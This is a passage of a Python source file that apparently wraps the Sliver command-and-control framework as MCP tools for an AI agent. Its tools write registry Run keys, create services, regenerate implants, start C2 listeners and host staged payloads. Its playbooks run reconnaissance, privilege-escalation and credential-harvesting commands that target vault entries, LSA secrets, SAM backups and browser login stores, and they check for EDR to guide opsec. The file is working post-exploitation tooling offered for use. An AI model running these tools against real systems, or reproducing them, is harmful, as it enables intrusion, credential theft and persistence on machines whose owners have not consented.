        prefix = f"{block}\n\n" if block else ""
        return prefix + json.dumps({
            "status": "dumped",
            "pid": pid,
            "save_path": save_to,
            "size_bytes": len(data),
        }, indent=2)
    except Exception as e:
        return _format_tool_error(
            "sliver_process_dump", e, session_id=session_id,
            context=f"pid={pid}",
            hints=["Run sliver_opsec_check first; LSASS dumps are high-risk on EDR-protected hosts."],
        )


# =========================================================================
#  REGISTRY WRITE / SERVICES
# =========================================================================


@mcp.tool()
async def sliver_registry_write(
    session_id: str,
    hive: str,
    reg_path: str,
    key: str,
    value: str,
    hostname: str = "",
) -> str:
    """Write a value to the Windows registry on the remote system.

    Args:
        session_id: Target session ID.
        hive: Registry hive (e.g. 'HKLM', 'HKCU').
        reg_path: Registry path (e.g. 'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run').
        key: Key/value name to write.
        value: Value data to write (string).
        hostname: Remote hostname for remote registry. Default: local.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_registry_write")
        if block and OPSEC_MODE == "block":
            return block
        session = await _interact(session_id)
        await session.registry_write(hive, reg_path, key, hostname or "", value)
        prefix = f"{block}\n\n" if block else ""
        return prefix + f"Registry value written: {hive}\\{reg_path}\\{key} = {value}"
    except Exception as e:
        return f"registry_write failed: {e}"


@mcp.tool()
async def sliver_registry_create_key(
    session_id: str,
    hive: str,
    reg_path: str,
    hostname: str = "",
) -> str:
    """Create a new registry key on the remote system.

    Args:
        session_id: Target session ID.
        hive: Registry hive (e.g. 'HKLM', 'HKCU').
        reg_path: Full registry path for the new key.
        hostname: Remote hostname for remote registry. Default: local.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_registry_create_key")
        if block and OPSEC_MODE == "block":
            return block
        session = await _interact(session_id)
        await session.registry_create_key(hive, reg_path, hostname or "")
        prefix = f"{block}\n\n" if block else ""
        return prefix + f"Registry key created: {hive}\\{reg_path}"
    except Exception as e:
        return f"registry_create_key failed: {e}"


@mcp.tool()
async def sliver_start_service(
    session_id: str,
    name: str,
    exe: str,
    hostname: str = "",
) -> str:
    """Create and start a Windows service on the remote system.

    Args:
        session_id: Target session ID.
        name: Service name.
        exe: Path to the executable for the service.
        hostname: Remote hostname (for remote service creation). Default: local.
    """
    try:
        block = await _opsec_preflight(session_id, "sliver_start_service")
        if block and OPSEC_MODE == "block":
            return block
        session = await _interact(session_id)
        result = await session.start_service(name, exe, hostname or "")
        prefix = f"{block}\n\n" if block else ""
        return prefix + f"Service '{name}' started on session {session_id}."
    except Exception as e:
        return f"start_service failed: {e}"


@mcp.tool()
async def sliver_stop_service(session_id: str, name: str) -> str:
    """Stop a Windows service on the remote system.

    Args:
        session_id: Target session ID.
        name: Service name to stop.
    """
    try:
        session = await _interact(session_id)
        await session.stop_service(name)
        return f"Service '{name}' stopped on session {session_id}."
    except Exception as e:
        return f"stop_service failed: {e}"


@mcp.tool()
async def sliver_remove_service(session_id: str, name: str) -> str:
    """Remove/uninstall a Windows service from the remote system.

    Args:
        session_id: Target session ID.
        name: Service name to remove.
    """
    try:
        session = await _interact(session_id)
        await session.remove_service(name)
        return f"Service '{name}' removed from session {session_id}."
    except Exception as e:
        return f"remove_service failed: {e}"


# =========================================================================
#  ENVIRONMENT / MISC
# =========================================================================


@mcp.tool()
async def sliver_set_env(session_id: str, name: str, value: str) -> str:
    """Set an environment variable on the remote system.

    Args:
        session_id: Target session ID.
        name: Environment variable name.
        value: Value to set.
    """
    try:
        session = await _interact(session_id)
        await session.set_env(name, value)
        return f"Environment variable set: {name}={value}"
    except Exception as e:
        return f"set_env failed: {e}"


@mcp.tool()
async def sliver_rename_session(session_id: str, new_name: str) -> str:
    """Rename a session for easier tracking during an engagement.

    Args:
        session_id: Session ID to rename.
        new_name: New name for the session.
    """
    try:
        client = await _get_client()
        await client.rename_session(session_id, new_name)
        return f"Session {session_id} renamed to '{new_name}'."
    except Exception as e:
        return f"rename_session failed: {e}"


@mcp.tool()
async def sliver_rename_beacon(beacon_id: str, new_name: str) -> str:
    """Rename a beacon for easier tracking during an engagement.

    Args:
        beacon_id: Beacon ID to rename.
        new_name: New name for the beacon.
    """
    try:
        client = await _get_client()
        await client.rename_beacon(beacon_id, new_name)
        return f"Beacon {beacon_id} renamed to '{new_name}'."
    except Exception as e:
        return f"rename_beacon failed: {e}"


@mcp.tool()
async def sliver_kill_beacon(beacon_id: str) -> str:
    """Kill / terminate an active beacon.

    Args:
        beacon_id: The beacon ID to kill (from sliver_beacons output).
    """
    try:
        client = await _get_client()
        await client.kill_beacon(beacon_id)
        return f"Beacon {beacon_id} killed."
    except Exception as e:
        return f"Failed to kill beacon {beacon_id}: {e}"


@mcp.tool()
async def sliver_regenerate_implant(
    implant_name: str,
    save_path: str = "/tmp/implant_regen.bin",
) -> str:
    """Regenerate a previously built implant by name (no recompilation needed).

    Args:
        implant_name: Name of the implant build (from sliver_implant_builds output).
        save_path: Local path to save the regenerated implant.
    """
    try:
        client = await _get_client()
        result = await client.regenerate_implant(implant_name)
        data = result.File.Data
        name = result.File.Name
        if data:
            Path(save_path).write_bytes(data)
        return json.dumps({
            "status": "regenerated",
            "name": name,
            "save_path": save_path,
            "size_bytes": len(data) if data else 0,
        }, indent=2)
    except Exception as e:
        return f"regenerate_implant failed: {e}"


@mcp.tool()
async def sliver_start_http_listener(
    lhost: str,
    lport: int = 80,
) -> str:
    """Start a plain HTTP C2 listener.

    Args:
        lhost: IP address or hostname to bind the listener to.
        lport: Port number (default 80).
    """
    try:
        client = await _get_client()
        job = await client.start_http_listener(lhost, lport)
        return json.dumps(
            {"status": "started", "job_id": job.JobID, "lhost": lhost, "lport": lport},
            indent=2,
        )
    except Exception as e:
        return f"Failed to start HTTP listener: {e}"


@mcp.tool()
async def sliver_website_add(
    website_name: str,
    web_path: str,
    local_path: str,
    content_type: str = "application/octet-stream",
) -> str:
    """Host a file on a Sliver HTTPS listener's built-in web server.

    Useful for staging payloads via HTTPS without an external web server.

    Args:
        website_name: Name of the website (creates one if it doesn't exist).
        web_path: URL path to serve the content at (e.g. '/font.woff').
        local_path: Local file path of the content to serve.
        content_type: HTTP Content-Type header. Default: application/octet-stream.
    """
    try:
        data = Path(local_path).read_bytes()
        client = await _get_client()
        await client.add_website_content(
            website_name, web_path, data, content_type
        )
        return json.dumps({
            "status": "added",
            "website": website_name,
            "path": web_path,
            "size": len(data),
            "content_type": content_type,
        }, indent=2)
    except FileNotFoundError:
        return f"Local file not found: {local_path}"
    except Exception as e:
        return f"website_add failed: {e}"


@mcp.tool()
async def sliver_websites() -> str:
    """List all websites hosted on Sliver listeners."""
    try:
        client = await _get_client()
        sites = await client.websites()
        if not sites:
            return "No websites configured."
        rows = []
        for site in sites:
            rows.append({
                "name": getattr(site, "Name", ""),
                "content_count": len(getattr(site, "Contents", {})),
            })
        return json.dumps(rows, indent=2)
    except Exception as e:
        return f"Failed to list websites: {e}"


@mcp.tool()
async def sliver_operators() -> str:
    """List all operators connected to the Sliver teamserver."""
    try:
        client = await _get_client()
        ops = await client.operators()
        if not ops:
            return "No operators connected."
        rows = []
        for op in ops:
            rows.append({
                "name": getattr(op, "Name", ""),
                "online": getattr(op, "Online", False),
            })
        return json.dumps(rows, indent=2)
    except Exception as e:
        return f"Failed to list operators: {e}"


# =========================================================================
#  OPERATOR PLAYBOOKS
# =========================================================================


async def _exec_quiet(session_id: str, exe: str, args: str = "") -> str:
    """Run a command on a session and return stdout, swallowing errors."""
    try:
        session = await _interact(session_id)
        arg_list = shlex.split(args) if args else []
        result = await session.execute(exe, arg_list, output=True)
        stdout = getattr(result, "Stdout", b"")
        if isinstance(stdout, bytes):
            stdout = stdout.decode("utf-8", errors="replace")
        return stdout.strip() if stdout else ""
    except Exception as e:
        return f"(error: {e})"


@mcp.tool()
async def sliver_playbook_initial_recon(session_id: str) -> str:
    """Run a full initial recon playbook on a target session.

    Executes in one call: whoami, system info, network config, process list,
    network connections, and local users. Results are compiled into a single report.
    Auto-logs the target in the engagement state database.

    Args:
        session_id: Target session ID.
    """
    results: dict[str, str] = {}

    results["whoami"] = await _exec_quiet(session_id, "whoami", "/all")
    results["hostname"] = await _exec_quiet(session_id, "hostname")
    results["systeminfo"] = await _exec_quiet(session_id, "systeminfo")
    results["ipconfig"] = await _exec_quiet(session_id, "ipconfig", "/all")
    results["netstat"] = await _exec_quiet(session_id, "netstat", "-ano")
    results["arp"] = await _exec_quiet(session_id, "arp", "-a")
    results["net_users"] = await _exec_quiet(session_id, "net", "user")
    results["net_localgroup_admins"] = await _exec_quiet(
        session_id, "net", "localgroup Administrators"
    )

    try:
        session = await _interact(session_id)
        ps_result = await session.ps()
        procs = getattr(ps_result, "Processes", []) or []
        top_procs = []
        for p in procs[:50]:
            top_procs.append(f"  PID={getattr(p, 'Pid', '?')} {getattr(p, 'Executable', '?')} (owner={getattr(p, 'Owner', '?')})")
        results["processes_sample"] = f"({len(procs)} total)\n" + "\n".join(top_procs)
    except Exception as e:
        results["processes_sample"] = f"(error: {e})"

    opsec = await _opsec_scan_session(session_id)
    if not opsec["safe"]:
        products = ", ".join(f"{d['product']} ({d['process']})" for d in opsec["detected"])
        results["opsec_warning"] = f"EDR/AV detected: {products}"

    summary = _summarize_initial_recon(results, opsec)
    if summary.get("hostname"):
        try:
            _state_upsert_target(
                hostname=summary["hostname"],
                ip=summary["ip_addresses"][0] if summary.get("ip_addresses") else "",
                os=summary.get("os", ""),
                domain=summary.get("domain", ""),
                access_level="admin" if summary.get("is_admin") else "user",
                notes="Auto-discovered via initial_recon playbook",
            )
            _state_log_access_sync(session_id, summary["hostname"], "initial_recon", "active")
        except Exception:
            pass

    return _format_playbook_result("initial_recon", summary, results)


@mcp.tool()
async def sliver_playbook_privesc_check(session_id: str) -> str:
    """Run a privilege escalation assessment playbook.

    Checks current privileges, local admin membership, UAC status, unquoted
    service paths, writable service binaries, AlwaysInstallElevated, and
    scheduled tasks owned by the current user.

    Args:
        session_id: Target session ID.
    """
    results: dict[str, str] = {}

    results["current_user"] = await _exec_quiet(session_id, "whoami", "/priv")
    results["groups"] = await _exec_quiet(session_id, "whoami", "/groups")
    results["local_admins"] = await _exec_quiet(
        session_id, "net", "localgroup Administrators"
    )

    results["uac_status"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA"
    )
    results["uac_consent"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin"
    )

    results["unquoted_services"] = await _exec_quiet(
        session_id, "cmd.exe",
        '/c wmic service get name,displayname,pathname,startmode 2>nul | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """'
    )

    results["always_install_elevated_hklm"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"
    )
    results["always_install_elevated_hkcu"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"
    )

    results["scheduled_tasks"] = await _exec_quiet(
        session_id, "schtasks", "/query /fo LIST /v"
    )

    results["auto_logon"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul"
    )

    summary = _summarize_privesc(results)
    return _format_playbook_result("privesc_check", summary, results)


@mcp.tool()
async def sliver_playbook_cred_harvest(session_id: str) -> str:
    """Run a credential harvesting assessment playbook.

    Enumerates cached credentials, saved Wi-Fi passwords, browser credential
    stores, vault entries, LSA secrets registry keys, and SAM backup files.
    Does NOT dump LSASS memory (use sliver_process_dump for that after OPSEC check).

    Args:
        session_id: Target session ID.
    """
    results: dict[str, str] = {}

    results["cmdkey_list"] = await _exec_quiet(session_id, "cmdkey", "/list")

    results["vault_list"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c vaultcmd /listcreds:\"Windows Credentials\" /all 2>nul"
    )

    results["wifi_profiles"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c netsh wlan show profiles 2>nul"
    )

    results["sam_backup_check"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c dir C:\\Windows\\Repair\\SAM C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul"
    )

    results["lsa_registry"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKLM\\SECURITY\\Policy\\Secrets 2>nul"
    )

    results["dpapi_creds"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c dir /a /s %APPDATA%\\Microsoft\\Credentials\\ 2>nul"
    )

    results["chrome_logins"] = await _exec_quiet(
        session_id, "cmd.exe",
        '/c dir "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" 2>nul'
    )

    results["edge_logins"] = await _exec_quiet(
        session_id, "cmd.exe",
        '/c dir "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data" 2>nul'
    )

    results["firefox_profiles"] = await _exec_quiet(
        session_id, "cmd.exe",
        '/c dir "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\logins.json" 2>nul'
    )

    summary = _summarize_cred_harvest(results)
    return _format_playbook_result("cred_harvest", summary, results)


@mcp.tool()
async def sliver_playbook_persist_check(session_id: str) -> str:
    """Run a persistence opportunity assessment playbook.

    Enumerates Run/RunOnce keys, startup folders, scheduled tasks, services,
    WMI subscriptions, and other common persistence locations to identify
    existing persistence and opportunities for new persistence.

    Args:
        session_id: Target session ID.
    """
    results: dict[str, str] = {}

    results["run_keys_hklm"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul"
    )
    results["run_keys_hkcu"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul"
    )
    results["runonce_hklm"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce 2>nul"
    )
    results["runonce_hkcu"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce 2>nul"
    )

    results["startup_folder_user"] = await _exec_quiet(
        session_id, "cmd.exe",
        '/c dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" 2>nul'
    )
    results["startup_folder_all"] = await _exec_quiet(
        session_id, "cmd.exe",
        '/c dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\" 2>nul'
    )

    results["scheduled_tasks"] = await _exec_quiet(
        session_id, "schtasks", "/query /fo LIST"
    )

    results["services"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c sc query state= all 2>nul | findstr /i \"SERVICE_NAME DISPLAY_NAME STATE\""
    )

    results["wmi_subscriptions"] = await _exec_quiet(
        session_id, "cmd.exe",
        '/c wmic /namespace:"\\\\root\\subscription" path __EventConsumer get Name,CommandLineTemplate 2>nul'
    )

    results["image_hijack"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" 2>nul"
    )

    results["winlogon"] = await _exec_quiet(
        session_id, "cmd.exe",
        "/c reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell 2>nul"
    )

    summary = _summarize_persist_check(results)
    return _format_playbook_result("persist_check", summary, results)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main():
    """Console-script entry point."""
    mcp.run(transport="stdio")


if __name__ == "__main__":
    main()
